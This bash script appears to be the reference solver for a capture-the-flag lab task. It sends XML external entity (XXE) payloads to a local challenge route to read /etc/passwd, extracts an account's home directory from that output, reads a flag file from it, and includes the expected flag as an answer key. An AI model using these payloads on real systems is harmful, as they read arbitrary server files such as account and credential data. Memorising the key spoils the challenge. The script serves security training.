#!/usr/bin/env bash
# solvers/p5_4.sh, Task 5.4 "The King's Sealed Archives" canonical exploit.
#
# challenges/phase5.py's p5_archives() route parses caller-supplied XML
# with core/xml_parser.parse(), the same shared parser as p5_3, configured
# with resolve_entities=True and load_dtd=True, and echoes back the text
# of the parsed <document> element. A SYSTEM entity in a caller-supplied
# DOCTYPE is a *reference* the parser resolves itself, `file://` URIs
# included; whatever it reads back is textually indistinguishable from
# content the caller typed directly, so an entity reference used as the
# <document> element's content gets its resolved file content echoed
# straight back in the response.
#
# This script proves four things against the live stack, in order:
#
#   1. An ordinary request (no DOCTYPE) echoes back exactly the plain
#      title text it was given, the desk's ordinary feature works and
#      leaks nothing on its own.
#   2. An XXE payload targeting /etc/passwd demonstrates arbitrary local
#      file read (not just the seeded flag file), proof this is a
#      genuine filesystem-read primitive, not a special-cased flag route.
#   3. The /etc/passwd read is parsed, not just displayed: the script
#      extracts the "king" account's own home directory field from it,
#      the exact same discovery move a blackbox challenger makes, rather
#      than a path this script already knows in advance.
#   4. An XXE payload targeting <that home directory>/flag.txt (a file
#      that exists only inside the container image, in a real account's
#      home directory, never served by any other route) recovers the
#      flag.

set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{external_entity_unsealed}"
ROUTE="${BASE}/p5/archives"

fail=0

echo "[p5_4] target: ${ROUTE}"

# --- Step 1: an ordinary request echoes back exactly what it was given ---
echo "[p5_4] step 1: ordinary request, no DOCTYPE"

plain_xml='<request><document>ancient-history-vol-3</document></request>'
plain_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "xml=${plain_xml}")
echo "  response: ${plain_resp}"

if echo "$plain_resp" | grep -q '"document_title":"ancient-history-vol-3"'; then
    echo "  ok: ordinary request echoed back exactly its own plain title"
else
    echo "[p5_4] FAIL: ordinary request did not echo its own title, route is broken"
    fail=1
fi
if echo "$plain_resp" | grep -qF "$FLAG"; then
    echo "[p5_4] FAIL: an ordinary request leaked the flag"
    fail=1
fi

# --- Step 2: XXE against /etc/passwd (general file-read demonstration) ---
echo "[p5_4] step 2: XXE file read: file:///etc/passwd"

passwd_xml='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><document>&xxe;</document></request>'
passwd_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "xml=${passwd_xml}")
echo "  response (truncated): $(echo "$passwd_resp" | head -c 300)..."

if echo "$passwd_resp" | grep -q "root:.*:0:0:"; then
    echo "  ok: /etc/passwd contents genuinely read back through the entity"
else
    echo "[p5_4] FAIL: /etc/passwd was not read back, XXE file read did not work"
    fail=1
fi

# --- Step 3: discover the King's home directory from that same read ------
echo "[p5_4] step 3: locate the 'king' account's home directory in /etc/passwd"

# The JSON value escapes newlines as \n; turn those back into real newlines
# so each passwd line (user:x:uid:gid:gecos:home:shell) is its own row.
king_line=$(echo "$passwd_resp" | sed 's/\\n/\n/g' | grep '^king:')
king_home=$(echo "$king_line" | cut -d: -f6)

if [ -n "$king_home" ]; then
    echo "  ok: found account line: ${king_line}"
    echo "  ok: king's home directory: ${king_home}"
else
    echo "[p5_4] FAIL: no 'king' account found in /etc/passwd"
    fail=1
fi

# --- Step 4: XXE against the sealed flag file -----------------------------
target_path="${king_home}/flag.txt"
echo "[p5_4] step 4: XXE file read: file://${target_path}"

flag_xml="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file://${target_path}\">]><request><document>&xxe;</document></request>"
flag_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "xml=${flag_xml}")
echo "  response: ${flag_resp}"

if echo "$flag_resp" | grep -qF "$FLAG"; then
    echo "  ok: sealed archive file read via external entity, flag recovered: ${FLAG}"
else
    echo "[p5_4] FAIL: ${target_path} was not read back via XXE"
    fail=1
fi

if [ "$fail" -ne 0 ]; then
    echo "[p5_4] FAIL"
    exit 1
fi

echo "[p5_4] ok: ordinary request clean, /etc/passwd read confirms general file-read,"
echo "[p5_4]     king's home directory discovered from that same read,"
echo "[p5_4]     sealed flag file read via a real external entity"
echo "[p5_4] PASS"
exit 0
